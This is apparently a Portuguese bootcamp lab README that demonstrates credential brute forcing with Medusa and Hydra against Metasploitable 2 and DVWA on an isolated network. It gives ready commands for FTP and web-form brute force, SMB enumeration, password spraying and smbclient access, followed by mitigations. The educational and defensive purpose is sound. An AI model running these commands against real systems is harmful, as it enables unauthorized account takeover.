# 🔐 Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

> Projeto prático do Bootcamp **Santander – Cibersegurança do Zero à Prática** (DIO).
> Simulação de ataques de força bruta em ambiente **controlado, isolado e autorizado**, com foco em entender as técnicas ofensivas para então propor **medidas de defesa**.

![Kali Linux](https://img.shields.io/badge/Kali%20Linux-557C94?style=flat&logo=kalilinux&logoColor=white)
![Medusa](https://img.shields.io/badge/Medusa-Brute%20Force-red?style=flat)
![Status](https://img.shields.io/badge/Status-Concluído-success?style=flat)

---

## ⚠️ Aviso Legal e Ético

Todo o conteúdo deste repositório foi produzido **exclusivamente para fins educacionais**, dentro de um **laboratório isolado** composto por máquinas virtuais em **rede interna (host-only)**, sem qualquer acesso à internet ou a sistemas de terceiros.

As máquinas-alvo (**Metasploitable 2** e **DVWA**) são sistemas **propositalmente vulneráveis**, criados pela própria comunidade de segurança para fins de estudo.

> **Ataques de força bruta contra sistemas que você não possui ou não tem autorização expressa por escrito para testar são crime** (no Brasil, enquadrados na Lei nº 12.737/2012 – "Lei Carolina Dieckmann" – e correlatas). Nunca aplique estas técnicas fora de um ambiente autorizado.

---

## 📑 Índice

1. [Objetivo do Projeto](#-objetivo-do-projeto)
2. [Conceitos Fundamentais](#-conceitos-fundamentais)
3. [Ambiente do Laboratório](#-ambiente-do-laboratório)
4. [Ferramentas Utilizadas](#-ferramentas-utilizadas)
5. [Criação das Wordlists](#-criação-das-wordlists)
6. [Cenário 1 – Força Bruta em FTP](#-cenário-1--força-bruta-em-ftp-metasploitable-2)
7. [Cenário 2 – Força Bruta em Formulário Web (DVWA)](#-cenário-2--força-bruta-em-formulário-web-dvwa)
8. [Cenário 3 – Password Spraying em SMB](#-cenário-3--password-spraying-em-smb)
9. [Validação dos Acessos](#-validação-dos-acessos)
10. [Medidas de Mitigação](#-medidas-de-mitigação)
11. [Conclusão e Aprendizados](#-conclusão-e-aprendizados)
12. [Referências](#-referências)

---

## 🎯 Objetivo do Projeto

Implementar, documentar e compartilhar um projeto prático utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes vulneráveis, para:

- Simular cenários de **ataque de força bruta** em diferentes serviços (FTP, Web e SMB);
- Exercitar a **enumeração de usuários** e o **password spraying**;
- Compreender, na prática, por que senhas fracas e serviços mal configurados são um risco crítico;
- Propor **medidas de prevenção e mitigação** para cada vetor.

---

## 📚 Conceitos Fundamentais

### O que é um ataque de força bruta?
É a tentativa sistemática de adivinhar credenciais testando **múltiplas combinações** de usuário/senha até encontrar uma válida. Variações:

| Técnica | Descrição |
|---|---|
| **Brute force puro** | Testa todas as combinações possíveis de caracteres. Lento, mas exaustivo. |
| **Ataque de dicionário** | Testa senhas de uma lista pré-definida (*wordlist*). Muito mais eficiente. |
| **Credential stuffing** | Reutiliza pares usuário/senha vazados em outros serviços. |
| **Password spraying** | Testa **poucas senhas comuns** contra **muitos usuários**, evitando o bloqueio por tentativas. |

### Principais ferramentas de brute force no Kali Linux

| Ferramenta | Foco principal |
|---|---|
| **Medusa** | Brute force paralelo e modular em serviços de rede (foco deste projeto) |
| **Hydra** | Similar ao Medusa, altamente versátil |
| **Ncrack** | Otimizada para auditoria de autenticação em rede |
| **John the Ripper** | Quebra de *hashes* de senha offline |
| **WPScan** | Enumeração e brute force específicos para WordPress |
| **Patator** | Multiuso, altamente configurável |

---

## 🧪 Ambiente do Laboratório

### Topologia

```
┌────────────────────────┐        Rede Interna          ┌────────────────────────────┐
│      KALI LINUX         │       (host-only)            │      METASPLOITABLE 2       │
│      (Atacante)         │◄────────────────────────────►│      / DVWA (Alvo)          │
│   IP: 192.168.56.10     │     192.168.56.0/24          │   IP: 192.168.56.20         │
└────────────────────────┘                              └────────────────────────────┘
```

### Configuração (VirtualBox)

| VM | Função | Rede |
|---|---|---|
| Kali Linux | Máquina atacante | Placa em **Rede Interna / Host-Only** |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB, serviços diversos) | Mesma rede interna |

> A rede **host-only** garante que o tráfego de ataque **nunca saia do seu computador**. Esse isolamento é o que torna o exercício ético e seguro.

### Reconhecimento inicial (Nmap)

Antes de qualquer ataque, mapeamos os serviços expostos no alvo:

```bash
# Descobrir o IP do alvo na rede interna
nmap -sn 192.168.56.0/24

# Varredura de portas e serviços com detecção de versão
nmap -sV -p- 192.168.56.20
```

Saída esperada (resumida) no Metasploitable 2:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
...
```

---

## 🛠 Ferramentas Utilizadas

- **Kali Linux** (máquina atacante)
- **Medusa** (brute forcer principal)
- **Nmap** (reconhecimento e enumeração)
- **smbclient** / **enum4linux** (interação e enumeração SMB)
- **DVWA** (alvo web vulnerável)
- **VirtualBox** (virtualização)

Verificando a instalação do Medusa:

```bash
medusa -h          # exibe a ajuda e os módulos disponíveis
medusa -d          # lista todos os módulos de serviço suportados
```

Parâmetros essenciais do Medusa:

| Flag | Significado |
|---|---|
| `-h` / `-H` | Host único / arquivo com lista de hosts |
| `-u` / `-U` | Usuário único / arquivo com lista de usuários |
| `-p` / `-P` | Senha única / arquivo de senhas (wordlist) |
| `-M` | Módulo do serviço (ex.: `ftp`, `http`, `smbnt`) |
| `-t` | Número de *threads* paralelas |
| `-f` / `-F` | Para após a primeira credencial válida (no host / global) |
| `-v` | Nível de verbosidade |

---

## 📝 Criação das Wordlists

Para os testes, criamos listas simples de usuários e senhas comuns.

**`usuarios.txt`**
```
msfadmin
admin
root
user
service
postgres
```

**`senhas.txt`**
```
msfadmin
admin
123456
password
root
toor
senha123
```

> Em cenários reais de auditoria, usam-se listas robustas como a **`rockyou.txt`** (já incluída no Kali em `/usr/share/wordlists/rockyou.txt.gz`). Gere wordlists personalizadas com ferramentas como **Crunch** ou **Cewl** quando precisar de termos específicos do alvo.

```bash
# Descompactar a rockyou (clássica no Kali)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Exemplo com Crunch: senhas de 6 a 8 caracteres, dígitos
crunch 6 8 0123456789 -o numeros.txt
```

---

## 🎯 Cenário 1 – Força Bruta em FTP (Metasploitable 2)

O serviço **vsftpd 2.3.4** do Metasploitable é um alvo clássico.

```bash
medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f -v 4
```

Interpretação do comando:
- `-h` → alvo;
- `-U` / `-P` → listas de usuários e senhas;
- `-M ftp` → módulo FTP;
- `-t 4` → 4 tentativas em paralelo;
- `-f` → para ao achar a primeira credencial válida no host.

**Evidência esperada:**
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

> 📸 *Inserir print em `/images/ftp-medusa.png`.*

---

## 🌐 Cenário 2 – Força Bruta em Formulário Web (DVWA)

Formulários de login web exigem o módulo `http` do Medusa, informando o método, o caminho e a condição de falha.

Primeiro, no DVWA (nível de segurança **Low**), identifique:
- O **caminho** do formulário (ex.: `/dvwa/vulnerabilities/brute/`);
- Os **campos** enviados (`username`, `password`, `Login`);
- A **mensagem de falha** (ex.: `Username and/or password incorrect`);
- O **cookie de sessão** (`PHPSESSID`) e o token, se houver.

```bash
medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt \
  -M http \
  -m DIR:/dvwa/vulnerabilities/brute/index.php \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -t 2 -v 4
```

> Como alternativa muito comum para formulários web, o **Hydra** costuma ser mais direto:
> ```bash
> hydra -L usuarios.txt -P senhas.txt 192.168.56.20 \
>   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=SEU_COOKIE; security=low"
> ```

> 📸 *Inserir print em `/images/dvwa-bruteforce.png`.*

---

## 🏢 Cenário 3 – Password Spraying em SMB

Simulação de um **cenário corporativo mal configurado**: muitos usuários, senhas fracas e padronizadas.

### Passo 1 – Enumeração de usuários
```bash
# Enumeração SMB para descobrir usuários e compartilhamentos
enum4linux -a 192.168.56.20

# Alternativa com nmap
nmap --script smb-enum-users -p 445 192.168.56.20
```

Com os usuários descobertos, montamos a lista `usuarios_smb.txt`.

### Passo 2 – Password spraying com Medusa
Em vez de muitas senhas por usuário (que dispara bloqueios), testamos **uma senha comum contra todos os usuários**:

```bash
medusa -h 192.168.56.20 -U usuarios_smb.txt -p "Senha@123" -M smbnt -t 1 -v 4
```

> Note o `-t 1` (sequencial) e uma única senha (`-p`): o objetivo é ser **discreto** e não travar as contas.

> 📸 *Inserir print em `/images/smb-spraying.png`.*

---

## ✅ Validação dos Acessos

Após obter credenciais válidas, confirmamos o acesso real ao serviço SMB com o **smbclient**:

```bash
# Listar compartilhamentos disponíveis para o usuário
smbclient -L //192.168.56.20 -U msfadmin

# Conectar a um compartilhamento específico
smbclient //192.168.56.20/tmp -U msfadmin
```

Dentro do `smbclient`, comandos como `ls`, `get` e `put` confirmam o nível de acesso obtido — evidência de que a credencial funciona de ponta a ponta.

> 📸 *Inserir print em `/images/smbclient-acesso.png`.*

---

## 🛡 Medidas de Mitigação

A parte mais importante de uma auditoria: **como se defender**.

| Vetor | Mitigação recomendada |
|---|---|
| **Senhas fracas** | Política de senhas fortes (tamanho mínimo, complexidade, proibir senhas vazadas). |
| **Tentativas ilimitadas** | **Account lockout** após N tentativas e **rate limiting** por IP. |
| **Ausência de 2FO** | Implementar **autenticação multifator (MFA)**. |
| **Serviços expostos** | Desabilitar serviços desnecessários; restringir por firewall e segmentação de rede. |
| **FTP/SMB legados** | Substituir protocolos em texto claro por versões seguras (SFTP, SMBv3 com assinatura). |
| **Falta de monitoramento** | **Fail2ban**, SIEM e alertas de múltiplas falhas de login. |
| **Password spraying** | Monitorar falhas distribuídas entre muitos usuários (padrão típico do ataque). |
| **Enumeração de usuários** | Mensagens de erro genéricas (não revelar se o usuário existe); restringir `null sessions` no SMB. |

Exemplo prático — protegendo o SSH com **Fail2ban**:
```bash
sudo apt install fail2ban
# Em /etc/fail2ban/jail.local: maxretry = 3, bantime = 1h
```

---

## 🎓 Conclusão e Aprendizados

Este laboratório demonstrou, na prática, como **senhas fracas e serviços mal configurados** transformam um ambiente em alvo fácil. Principais lições:

- Força bruta é eficaz **apenas** contra configurações negligentes — a defesa correta a neutraliza;
- A fase de **reconhecimento e enumeração** (Nmap, enum4linux) é tão importante quanto o ataque em si;
- **Password spraying** é perigoso justamente por burlar bloqueios de conta;
- Documentar o processo e propor **mitigações** é o que diferencia um profissional de segurança de um simples "operador de ferramenta".

> O valor do pentest não está em invadir, e sim em **entender o risco para então eliminá-lo**.

---

## 📂 Estrutura do Repositório

```
.
├── README.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas.txt
│   └── usuarios_smb.txt
├── scripts/
│   └── (scripts auxiliares, se houver)
└── images/
    ├── nmap-scan.png
    ├── ftp-medusa.png
    ├── dvwa-bruteforce.png
    ├── smb-spraying.png
    └── smbclient-acesso.png
```

---

## 🔗 Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [Medusa – Documentação](https://github.com/jmk-foofus/medusa)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Nmap – Manual Oficial](https://nmap.org/book/man.html)
- [Metasploitable 2 – Documentação](https://docs.rapid7.com/metasploit/metasploitable-2/)

---

<p align="center">
  Desenvolvido como parte do Bootcamp <strong>Santander – Cibersegurança do Zero à Prática</strong> 🚀<br>
  <em>Digital Innovation One (DIO)</em>
</p>
